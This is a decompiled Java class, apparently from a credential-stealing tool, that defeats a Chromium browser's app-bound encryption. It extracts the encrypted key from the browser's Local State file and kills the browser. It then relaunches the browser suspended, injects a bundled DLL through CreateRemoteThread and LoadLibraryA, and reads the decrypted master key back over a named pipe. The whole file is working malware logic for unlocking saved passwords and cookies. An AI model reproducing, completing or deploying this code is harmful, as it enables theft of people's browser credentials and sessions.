/*
 * Decompiled with CFR 0.152.
 */
package aether.browser;

import aether.browser.Win32Abe;
import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.WString;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.LongByReference;
import com.sun.jna.win32.StdCallLibrary;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.FileAttribute;
import java.util.Arrays;
import java.util.Base64;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import x.m;

public class AbeInjector {
    public static boolean a(String string) {
        try {
            string = new String(Files.readAllBytes(Paths.get(string, new String[0])));
            return string.contains("\"app_bound_encrypted_key\"");
        }
        catch (IOException iOException) {
            return false;
        }
    }

    private static Path a() throws IOException {
        InputStream inputStream2 = AbeInjector.class.getResourceAsStream("/fappbound.dll");
        if (inputStream2 == null) {
            throw new IOException("fappbound.dll not found in JAR");
        }
        Path path = Files.createTempFile("fpb_", ".dll", new FileAttribute[0]);
        path.toFile().deleteOnExit();
        try {
            Files.copy(inputStream2, path, StandardCopyOption.REPLACE_EXISTING);
        }
        finally {
            if (inputStream2 != null) {
                inputStream2.close();
            }
        }
        return path;
    }

    private static int a(int n2, int n3) {
        return n2 << n3 | n2 >>> 32 - n3;
    }

    /*
     * Loose catch block
     */
    public static byte[] a(String object, String object2) throws Exception {
        Object object3 = object2;
        Object object4 = new String(Files.readAllBytes(Paths.get((String)object3, new String[0])));
        int n2 = ((String)object4).indexOf("\"app_bound_encrypted_key\"");
        if (n2 < 0) {
            throw new Exception("app_bound_encrypted_key not found");
        }
        int n3 = ((String)object4).indexOf(58, n2);
        int n4 = ((String)object4).indexOf(34, n3 + 1) + 1;
        int n5 = ((String)object4).indexOf(34, n4);
        byte[] byArray = Base64.getDecoder().decode(((String)object4).substring(n4, n5));
        object4 = byArray;
        if (byArray.length <= 4) {
            throw new Exception("encrypted key too short: " + ((Object)object4).length);
        }
        object2 = Arrays.copyOfRange((byte[])object4, 4, ((Object)object4).length);
        Path path = AbeInjector.a();
        object3 = Paths.get((String)object, new String[0]).getFileName().toString();
        try {
            new ProcessBuilder(new String[]{"taskkill", "/F", "/IM", object3}).redirectErrorStream(true).start().waitFor(3L, TimeUnit.SECONDS);
        }
        catch (IOException iOException) {}
        String string = object3;
        Pointer pointer = Win32Abe.K.INSTANCE.CreateToolhelp32Snapshot(2, 0);
        if (pointer != null && Pointer.nativeValue(pointer) != -1L) {
            try {
                Memory memory = new Memory(568L);
                ((Pointer)memory).setInt(0L, 568);
                if (Win32Abe.K.INSTANCE.Process32FirstW(pointer, memory)) {
                    do {
                        if ((n5 = ((Pointer)memory).getInt(8L)) == 0 || !((String)(object4 = m.a(memory, 48, 260))).equalsIgnoreCase(string) || (object4 = Win32Abe.K.INSTANCE.OpenProcess(1, false, n5)) == null) continue;
                        Win32Abe.K.INSTANCE.TerminateProcess((Pointer)object4, 0);
                        Win32Abe.K.INSTANCE.CloseHandle((Pointer)object4);
                    } while (Win32Abe.K.INSTANCE.Process32NextW(pointer, memory));
                }
            }
            finally {
                Win32Abe.K.INSTANCE.CloseHandle(pointer);
            }
        }
        for (int i2 = 0; i2 < 40; ++i2) {
            Thread.sleep(100L);
            if (m.a((String)object3).isEmpty()) break;
        }
        Thread.sleep(300L);
        object3 = new Memory(104L);
        ((Memory)object3).clear();
        ((Pointer)object3).setInt(0L, 104);
        Memory memory = new Memory(24L);
        memory.clear();
        object = new WString((String)object);
        Pointer pointer2 = Pointer.NULL;
        Pointer pointer3 = Pointer.NULL;
        if (!Win32Abe.KRaw.INSTANCE.CreateProcessW((WString)object, pointer2, pointer2, Pointer.NULL, 0, 4, pointer3, pointer3, (Pointer)object3, memory)) {
            throw new Exception("CreateProcess failed: error=" + Native.getLastError());
        }
        object = ((Pointer)memory).getPointer(0L);
        object3 = ((Pointer)memory).getPointer(8L);
        int n6 = ((Pointer)memory).getInt(16L);
        object2 = AbeInjector.a((Pointer)object, n6, (byte[])object2, path);
        Win32Abe.K.INSTANCE.TerminateProcess((Pointer)object, 0);
        Win32Abe.K.INSTANCE.CloseHandle((Pointer)object);
        Win32Abe.K.INSTANCE.CloseHandle((Pointer)object3);
        try {
            Files.deleteIfExists(path);
        }
        catch (IOException iOException) {}
        return object2;
        {
            catch (Throwable throwable) {
                try {
                    Win32Abe.K.INSTANCE.TerminateProcess((Pointer)object, 0);
                    Win32Abe.K.INSTANCE.CloseHandle((Pointer)object);
                    Win32Abe.K.INSTANCE.CloseHandle((Pointer)object3);
                    throw throwable;
                }
                catch (Throwable throwable2) {
                    try {
                        Files.deleteIfExists(path);
                    }
                    catch (IOException iOException) {}
                    throw throwable2;
                }
            }
        }
    }

    private static byte[] a(Pointer object, int n2, byte[] object2, Path object3) throws Exception {
        boolean bl;
        long l2 = n2;
        n2 = (int)l2;
        int n3 = AbeInjector.a(n2 ^ 0xA5A5A5A5, 5);
        int n4 = AbeInjector.a(n2 ^ 0x3C6EF372, 11);
        int n5 = AbeInjector.a(n2 ^ 0x1BF5A7E1, 17);
        n2 = AbeInjector.a(n2 ^ 0x9E3779B9, 23);
        Object object4 = String.format("%08X%08X%08X%08X", (long)n3 & 0xFFFFFFFFL, (long)n4 & 0xFFFFFFFFL, (long)n5 & 0xFFFFFFFFL, (long)n2 & 0xFFFFFFFFL);
        object4 = "\\\\.\\pipe\\" + (String)object4;
        if ((object4 = KA.INSTANCE.CreateNamedPipeA((String)object4, 3, 0, 1, 65536, 65536, 0, Pointer.NULL)) == null || Pointer.nativeValue((Pointer)object4) == -1L) {
            throw new Exception("CreateNamedPipe failed: error=" + KA.INSTANCE.GetLastError());
        }
        Pointer pointer = KA.INSTANCE.VirtualAllocEx((Pointer)object, Pointer.NULL, ((Object)(object3 = (Object)(object3.toAbsolutePath().toString() + "\u0000").getBytes(StandardCharsets.US_ASCII))).length, 12288, 4);
        if (pointer == null || Pointer.nativeValue(pointer) == 0L) {
            Win32Abe.K.INSTANCE.CloseHandle((Pointer)object4);
            throw new Exception("VirtualAllocEx failed");
        }
        Future<Boolean> future = object3;
        KA.INSTANCE.WriteProcessMemory((Pointer)object, pointer, (byte[])future, ((Object)future).length, new LongByReference());
        object3 = KA.INSTANCE.GetModuleHandleA("kernel32.dll");
        object3 = KA.INSTANCE.GetProcAddress((Pointer)object3, "LoadLibraryA");
        object = KA.INSTANCE.CreateRemoteThread((Pointer)object, Pointer.NULL, 0L, (Pointer)object3, pointer, 0, null);
        if (object == null || Pointer.nativeValue((Pointer)object) == 0L) {
            Win32Abe.K.INSTANCE.CloseHandle((Pointer)object4);
            throw new Exception("CreateRemoteThread failed: error=" + KA.INSTANCE.GetLastError());
        }
        KA.INSTANCE.WaitForSingleObject((Pointer)object, 5000);
        Win32Abe.K.INSTANCE.CloseHandle((Pointer)object);
        object = Executors.newSingleThreadExecutor(runnable2 -> {
            runnable2 = new Thread(runnable2, "abe-pipe");
            ((Thread)runnable2).setDaemon(true);
            return runnable2;
        });
        object3 = object.submit(() -> AbeInjector.a((Pointer)object4));
        object.shutdown();
        try {
            bl = object3.get(10L, TimeUnit.SECONDS);
        }
        catch (TimeoutException timeoutException) {
            object3.cancel(true);
            Win32Abe.K.INSTANCE.CloseHandle((Pointer)object4);
            throw new Exception("Pipe timeout \u2014 COM DecryptData may have failed");
        }
        if (!bl) {
            Win32Abe.K.INSTANCE.CloseHandle((Pointer)object4);
            throw new Exception("ConnectNamedPipe failed");
        }
        Object object5 = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(((byte[])object2).length).array();
        object3 = new IntByReference();
        KA.INSTANCE.WriteFile((Pointer)object4, (byte[])object5, 4, (IntByReference)object3, Pointer.NULL);
        KA.INSTANCE.WriteFile((Pointer)object4, (byte[])object2, ((byte[])object2).length, (IntByReference)object3, Pointer.NULL);
        object5 = new byte[256];
        object2 = new IntByReference();
        boolean bl2 = KA.INSTANCE.ReadFile((Pointer)object4, (byte[])object5, ((byte[])object5).length, (IntByReference)object2, Pointer.NULL);
        KA.INSTANCE.DisconnectNamedPipe((Pointer)object4);
        Win32Abe.K.INSTANCE.CloseHandle((Pointer)object4);
        if (!bl2 || ((IntByReference)object2).getValue() == 0) {
            throw new Exception("ReadFile failed (bytes=" + ((IntByReference)object2).getValue() + ")");
        }
        String string = new String((byte[])object5, 0, ((IntByReference)object2).getValue(), StandardCharsets.US_ASCII).trim();
        object5 = string;
        if (string.length() != 64) {
            throw new Exception("Unexpected key length: " + ((String)object5).length());
        }
        object4 = new byte[32];
        for (int i2 = 0; i2 < 32; ++i2) {
            object4[i2] = (byte)Integer.parseInt(((String)object5).substring(i2 << 1, (i2 << 1) + 2), 16);
        }
        return object4;
    }

    private static /* synthetic */ Boolean a(Pointer pointer) throws Exception {
        boolean bl = KA.INSTANCE.ConnectNamedPipe(pointer, Pointer.NULL);
        return bl || KA.INSTANCE.GetLastError() == 535;
    }

    static interface KA
    extends StdCallLibrary {
        public static final KA INSTANCE = Native.load("kernel32", KA.class);

        public Pointer VirtualAllocEx(Pointer var1, Pointer var2, long var3, int var5, int var6);

        public boolean WriteProcessMemory(Pointer var1, Pointer var2, byte[] var3, long var4, LongByReference var6);

        public Pointer CreateRemoteThread(Pointer var1, Pointer var2, long var3, Pointer var5, Pointer var6, int var7, IntByReference var8);

        public int WaitForSingleObject(Pointer var1, int var2);

        public Pointer GetModuleHandleA(String var1);

        public Pointer GetProcAddress(Pointer var1, String var2);

        public Pointer CreateNamedPipeA(String var1, int var2, int var3, int var4, int var5, int var6, int var7, Pointer var8);

        public boolean ConnectNamedPipe(Pointer var1, Pointer var2);

        public boolean WriteFile(Pointer var1, byte[] var2, int var3, IntByReference var4, Pointer var5);

        public boolean ReadFile(Pointer var1, byte[] var2, int var3, IntByReference var4, Pointer var5);

        public boolean DisconnectNamedPipe(Pointer var1);

        public int GetLastError();
    }
}

